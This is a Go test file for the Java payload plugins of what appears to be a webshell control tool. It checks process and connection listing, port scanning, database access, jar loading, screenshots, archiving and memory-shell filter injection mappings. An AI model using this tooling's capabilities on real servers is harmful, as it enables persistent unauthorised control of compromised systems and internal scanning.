package webshell

// javaext_test.go — Java 载体的进程/网络/数据库插件。
//
// 这三个插件是对脚本载体（php/jsp 源码）的等价重写，最容易翻车的不是编译而是回显格式：
// 前端面板按脚本插件那套 JSON 结构解析（procs / open / columns+rows），字段一漂移
// 就是「面板空白但接口 200」。所以测试重点放在结构断言上，而不是「能跑就行」。

import (
	"archive/zip"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
)

// TestJavaPayloadProcList 进程列表：结构与脚本插件一致，且支持按 PID/关键字过滤。
func TestJavaPayloadProcList(t *testing.T) {
	run := javaRunner(t)
	raw := strings.TrimSpace(run("proc", "list", ""))
	if strings.HasPrefix(raw, "ERROR:") {
		t.Fatalf("proc 返回错误: %s", raw)
	}
	var got struct {
		OS    string `json:"os"`
		Procs []struct {
			PID  int    `json:"pid"`
			Name string `json:"name"`
			User string `json:"user"`
		} `json:"procs"`
	}
	if err := json.Unmarshal([]byte(raw), &got); err != nil {
		t.Fatalf("proc 输出不是合法 JSON: %v\n%s", err, head(raw, 300))
	}
	if got.OS != "linux" && got.OS != "win" {
		t.Fatalf("os 字段异常: %q", got.OS)
	}
	if len(got.Procs) == 0 {
		t.Fatal("进程列表为空")
	}
	// 至少要有一个带名字的进程——名字为空说明 /proc/<pid>/status 解析全挂
	named := 0
	for _, p := range got.Procs {
		if strings.TrimSpace(p.Name) != "" {
			named++
		}
	}
	if named == 0 {
		t.Fatal("所有进程名都为空，status 解析有问题")
	}

	// 按 PID 过滤：必须只剩那一条，且 PID 精确匹配（不能退化成模糊匹配）
	pid := strconv.Itoa(got.Procs[0].PID)
	filtered := strings.TrimSpace(run("proc", "list", pid))
	var one struct {
		Procs []struct {
			PID int `json:"pid"`
		} `json:"procs"`
	}
	if err := json.Unmarshal([]byte(filtered), &one); err != nil {
		t.Fatalf("过滤结果不是合法 JSON: %v\n%s", err, head(filtered, 300))
	}
	if len(one.Procs) != 1 || strconv.Itoa(one.Procs[0].PID) != pid {
		t.Fatalf("按 PID %s 过滤结果异常: %s", pid, head(filtered, 300))
	}
}

// TestJavaPayloadNetList 连接列表：Linux 读 /proc/net/tcp，Windows 走 netstat。
// 两个平台都必须能解析出至少监听项——本机跑测试时总有监听端口。
func TestJavaPayloadNetList(t *testing.T) {
	run := javaRunner(t)
	raw := strings.TrimSpace(run("net", "list", "", ""))
	if strings.HasPrefix(raw, "ERROR:") {
		t.Fatalf("net list 返回错误: %s", raw)
	}
	var conns []struct {
		Proto  string `json:"proto"`
		Local  string `json:"local"`
		Remote string `json:"remote"`
		State  string `json:"state"`
	}
	if err := json.Unmarshal([]byte(raw), &conns); err != nil {
		t.Fatalf("net list 输出不是合法 JSON: %v\n%s", err, head(raw, 300))
	}
	if len(conns) == 0 {
		t.Fatal("连接列表为空（netstat / /proc/net/tcp 解析可能全挂）")
	}
	listen := 0
	for _, c := range conns {
		if c.Local == "" {
			t.Fatalf("local 为空，地址解码有问题: %+v", c)
		}
		if strings.Contains(strings.ToUpper(c.State), "LISTEN") {
			listen++
		}
	}
	if listen == 0 {
		t.Logf("未发现 LISTEN 状态连接（容器内可能正常），共 %d 条", len(conns))
	}
}

// TestJavaPayloadNetScan 端口扫描：对已知监听端口必须扫出 open，对同批次的关闭端口不能误报。
func TestJavaPayloadNetScan(t *testing.T) {
	run := javaRunner(t)
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Skip("本机无法监听，跳过扫描测试:", err)
	}
	defer ln.Close()
	open := ln.Addr().(*net.TCPAddr).Port

	// 关掉的对照端口：用 1（tcpmux，现网基本不可能监听），避免临时端口段里
	// 恰好有别的服务在听，导致误报断言反过来把测试搞挂
	closed := 1
	raw := strings.TrimSpace(run("net", "scan", "127.0.0.1",
		strconv.Itoa(closed)+","+strconv.Itoa(open)))
	var got struct {
		Host string  `json:"host"`
		Open []int64 `json:"open"`
	}
	if err := json.Unmarshal([]byte(raw), &got); err != nil {
		t.Fatalf("net scan 输出不是合法 JSON: %v\n%s", err, head(raw, 300))
	}
	if got.Host != "127.0.0.1" {
		t.Fatalf("host 回显异常: %q", got.Host)
	}
	found := false
	for _, p := range got.Open {
		if int(p) == open {
			found = true
		}
		if int(p) == closed {
			t.Fatalf("关闭端口 %d 被误报为 open: %s", closed, raw)
		}
	}
	if !found {
		t.Fatalf("监听端口 %d 未被扫出: %s", open, raw)
	}
}

// TestJavaPayloadDB Java 载荷没有驱动时必须是「可解释的 ERROR」而不是异常或挂死。
// 本机若恰好有 mysql 驱动（构建机常装），则断言输出是合法结果 JSON。
func TestJavaPayloadDB(t *testing.T) {
	run := javaRunner(t)

	probe := strings.TrimSpace(run("db", "drivers"))
	if strings.HasPrefix(probe, "ERROR:") {
		t.Fatalf("db drivers 不该按 ERROR 返回: %s", probe)
	}
	if !strings.Contains(probe, "classpath=") {
		t.Fatalf("db drivers 缺少 classpath 信息: %s", head(probe, 200))
	}

	out := strings.TrimSpace(run("db", "mysql", "127.0.0.1", "3306", "u", "p", "nodb", "SELECT 1"))
	if strings.HasPrefix(out, "ERROR:") {
		// 预期路径：驱动缺失 / 连接失败，都必须是带原因的单行错误
		if strings.ContainsAny(out, "{}") {
			t.Fatalf("ERROR 回显不应夹带 JSON: %s", head(out, 200))
		}
		return
	}
	var res struct {
		OK      bool     `json:"ok"`
		Columns []string `json:"columns"`
	}
	if err := json.Unmarshal([]byte(out), &res); err != nil {
		t.Fatalf("db 结果不是合法 JSON: %v\n%s", err, head(out, 300))
	}
}

// TestJavaExtOpMapping 插件 op → 载荷 op 的映射是纯函数，直接断言，避免改错参数顺序
// （db 有 7 个位置参数，错一位就是连到别的库上）。
func TestJavaExtOpMapping(t *testing.T) {
	p := ExtParams{
		DBType: "pgsql", Host: "10.0.0.5", Port: "5432", User: "u", Pass: "p", DB: "d",
		SQL: "SELECT 1", ScanHost: "10.0.0.6", ScanPorts: "80,443",
		FilterName: "fs", GateHeader: "X-A", GateValue: "b", Cmd: "java",
		SrcPath: "/tmp/www", DstPath: "/tmp/out.zip",
	}
	cases := []struct {
		op   string
		jop  string
		args []string
	}{
		{"proc_list", "proc", []string{"list", "java"}},
		{"net_scan", "net", []string{"scan", "10.0.0.6", "80,443"}},
		{"net_list", "net", []string{"list"}},
		{"db_exec", "db", []string{"pgsql", "10.0.0.5", "5432", "u", "p", "d", "SELECT 1", ""}},
		{"db_probe", "db", []string{"drivers"}},
		{"servlet_list", "servlets", nil},
		{"jar_load", "jarload", []string{"", "/tmp/out.zip"}},
		{"screenshot", "shot", nil},
		{"zip", "zip", []string{"/tmp/www", "/tmp/out.zip"}},
		{"unzip", "unzip", []string{"/tmp/www", "/tmp/out.zip"}},
		{"memshell_probe", "memshell_probe", nil},
		{"memshell_add_filter", "memshell_inject", []string{"fs", "X-A", "b", "cmd"}},
		{"memshell_list", "memshell_list", nil},
		{"memshell_del", "memshell_remove", []string{"fs"}},
	}
	for _, c := range cases {
		jop, args, ok := javaExtOp(c.op, p)
		if !ok {
			t.Fatalf("%s 未被识别为 Java 承载的插件", c.op)
		}
		if jop != c.jop {
			t.Fatalf("%s → 载荷 op 期望 %q，实际 %q", c.op, c.jop, jop)
		}
		if strings.Join(args, "\x00") != strings.Join(c.args, "\x00") {
			t.Fatalf("%s 参数期望 %q，实际 %q", c.op, c.args, args)
		}
	}
	// 没给 jar_path 时 db 的第 8 个参数必须是空串——多一位参数就是「连错库」这类事故
	if _, args, _ := javaExtOp("db_exec", ExtParams{JarPath: "/tmp/mysql.jar"}); len(args) != 8 || args[7] != "/tmp/mysql.jar" {
		t.Fatalf("db_exec 未把 jar_path 透传到第 8 个参数: %q", args)
	}
	// 没有等价实现的插件必须明确拒绝，不能悄悄发空 payload 给目标端
	for _, op := range []string{"php_info", "php_scan", "php_writedirs"} {
		if _, _, ok := javaExtOp(op, p); ok {
			t.Fatalf("%s 不该被 Java 载体承接", op)
		}
	}
}

func head(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}

// TestJavaPayloadServletList 枚举：没有 ServletContext 时也必须回结构化 JSON（available=false），
// 而不是抛异常或回空串——否则前端 Servlet 面板会显示「解析失败」，看不出是「环境不支持」。
func TestJavaPayloadServletList(t *testing.T) {
	run := javaRunner(t)
	raw := strings.TrimSpace(run("servlets"))
	if strings.HasPrefix(raw, "ERROR:") {
		t.Fatalf("servlets 返回错误: %s", raw)
	}
	var got struct {
		Context struct {
			API       string `json:"api"`
			Available bool   `json:"available"`
		} `json:"context"`
		Servlets []map[string]any `json:"servlets"`
		Filters  []map[string]any `json:"filters"`
	}
	if err := json.Unmarshal([]byte(raw), &got); err != nil {
		t.Fatalf("servlets 输出不是合法 JSON: %v\n%s", err, head(raw, 300))
	}
	// 宿主进程里没有 ServletContext，所以必须是「不可用但结构完整」
	if got.Context.Available {
		t.Fatal("无 ServletContext 时 available 应为 false")
	}
	if got.Context.API == "" {
		t.Fatal("api 字段为空，无法判断 javax/jakarta")
	}
}

// TestJavaPayloadJarLoad 上传装载：写盘 + 回报路径与 class 数。
// 用最小 zip 当 jar，重点验证「能解出合法 jar、回结构化结果、文件真的落盘」。
func TestJavaPayloadJarLoad(t *testing.T) {
	run := javaRunner(t)
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	w, err := zw.Create("META-INF/MANIFEST.MF")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := w.Write([]byte("Manifest-Version: 1.0\n")); err != nil {
		t.Fatal(err)
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	b64 := base64.StdEncoding.EncodeToString(buf.Bytes())

	dst := filepath.Join(t.TempDir(), "probe.jar")
	raw := strings.TrimSpace(run("jarload", b64, dst))
	if strings.HasPrefix(raw, "ERROR:") {
		t.Fatalf("jarload 返回错误: %s", raw)
	}
	var got struct {
		OK     bool   `json:"ok"`
		Path   string `json:"path"`
		Size   int    `json:"size"`
		ClassN int    `json:"classes"`
	}
	if err := json.Unmarshal([]byte(raw), &got); err != nil {
		t.Fatalf("jarload 输出不是合法 JSON: %v\n%s", err, head(raw, 300))
	}
	if !got.OK || got.Size != buf.Len() {
		t.Fatalf("jarload 结果异常: %s", head(raw, 300))
	}
	if st, err := os.Stat(got.Path); err != nil || st.Size() != int64(buf.Len()) {
		t.Fatalf("jar 没有落盘或大小不符: %v", err)
	}
	if got.ClassN != 0 {
		t.Fatalf("空 jar 不该数出 class: %d", got.ClassN)
	}

	// 非法 base64 要回可读错误，不能崩
	if out := strings.TrimSpace(run("jarload", "not-base64!!", "")); !strings.HasPrefix(out, "ERROR:") {
		t.Fatalf("非法 base64 应回 ERROR，实际: %s", head(out, 120))
	}
}

// TestJavaPayloadScreenshot 截屏：要么给 IMG:<PNG base64>，要么给一句明确的不可用原因。
// 无头/有桌面取决于运行环境，所以只断言「两种合法形态之一」，不做环境假设。
func TestJavaPayloadScreenshot(t *testing.T) {
	run := javaRunner(t)
	out := strings.TrimSpace(run("shot"))
	if strings.HasPrefix(out, "ERROR:") {
		if !strings.Contains(out, "headless") && !strings.Contains(out, "截屏不可用") &&
			!strings.Contains(out, "Robot") && !strings.Contains(out, "AWT") {
			t.Fatalf("不可用原因不够具体: %s", head(out, 200))
		}
		return
	}
	if !strings.HasPrefix(out, "IMG:") {
		t.Fatalf("截屏应回 IMG: 前缀: %s", head(out, 120))
	}
	png, err := base64.StdEncoding.DecodeString(strings.TrimPrefix(out, "IMG:"))
	if err != nil {
		t.Fatalf("IMG 内容不是合法 base64: %v", err)
	}
	if len(png) < 8 || !bytes.Equal(png[:8], []byte{0x89, 'P', 'N', 'G', 0x0d, 0x0a, 0x1a, 0x0a}) {
		t.Fatal("IMG 内容不是 PNG")
	}
}

// TestJavaPayloadZip 打包/解包：目录要递归、空目录要保留、内容要能原样解回来。
// 站点备份这类场景最容易踩的是「空目录消失」和「中文/反斜杠路径对不上」，
// 所以断言放在解包后的目录结构上，不只是看返回 OK。
func TestJavaPayloadZip(t *testing.T) {
	run := javaRunner(t)
	base := t.TempDir()
	src := filepath.Join(base, "www")
	if err := os.MkdirAll(filepath.Join(src, "sub"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(src, "empty"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(src, "a.txt"), []byte("alpha"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(src, "sub", "b.txt"), []byte("bravo"), 0o644); err != nil {
		t.Fatal(err)
	}

	zipPath := filepath.Join(base, "www.zip")
	if out := strings.TrimSpace(run("zip", src, zipPath)); !strings.HasPrefix(out, "OK") {
		t.Fatalf("zip 返回异常: %s", head(out, 200))
	}
	if st, err := os.Stat(zipPath); err != nil || st.Size() == 0 {
		t.Fatalf("压缩包未生成: %v", err)
	}

	outDir := filepath.Join(base, "out")
	if r := strings.TrimSpace(run("unzip", zipPath, outDir)); !strings.HasPrefix(r, "OK") {
		t.Fatalf("unzip 返回异常: %s", head(r, 200))
	}
	if b, err := os.ReadFile(filepath.Join(outDir, "a.txt")); err != nil || string(b) != "alpha" {
		t.Fatalf("根目录文件未还原: %q %v", b, err)
	}
	if b, err := os.ReadFile(filepath.Join(outDir, "sub", "b.txt")); err != nil || string(b) != "bravo" {
		t.Fatalf("子目录文件未还原: %q %v", b, err)
	}
	if fi, err := os.Stat(filepath.Join(outDir, "empty")); err != nil || !fi.IsDir() {
		t.Fatalf("空目录未保留: %v", err)
	}
}

// TestJavaPayloadZipSlip 越界条目必须被丢弃。
// 压缩包可能来自目标机上的任意来源（上传目录、临时文件），载荷不能配合它往
// 解压目录外面写文件——那等于给了对方一个任意写入口。
func TestJavaPayloadZipSlip(t *testing.T) {
	run := javaRunner(t)
	base := t.TempDir()
	zipPath := filepath.Join(base, "evil.zip")

	f, err := os.Create(zipPath)
	if err != nil {
		t.Fatal(err)
	}
	zw := zip.NewWriter(f)
	// 手工写 header，绕开 zip.Writer 对不安全名字的清理
	h := &zip.FileHeader{Name: "../escaped.txt", Method: zip.Deflate}
	w, err := zw.CreateHeader(h)
	if err != nil {
		t.Fatalf("造越界条目失败: %v", err)
	}
	if _, err := w.Write([]byte("pwned")); err != nil {
		t.Fatal(err)
	}
	ok, err := zw.Create("inside.txt")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := ok.Write([]byte("fine")); err != nil {
		t.Fatal(err)
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := f.Close(); err != nil {
		t.Fatal(err)
	}

	outDir := filepath.Join(base, "out")
	r := strings.TrimSpace(run("unzip", zipPath, outDir))
	if !strings.HasPrefix(r, "OK") {
		t.Fatalf("unzip 返回异常: %s", head(r, 200))
	}
	if _, err := os.Stat(filepath.Join(base, "escaped.txt")); err == nil {
		t.Fatal("越界条目被写到了解压目录之外")
	}
	if b, err := os.ReadFile(filepath.Join(outDir, "inside.txt")); err != nil || string(b) != "fine" {
		t.Fatalf("正常条目应照常解出: %q %v", b, err)
	}
}
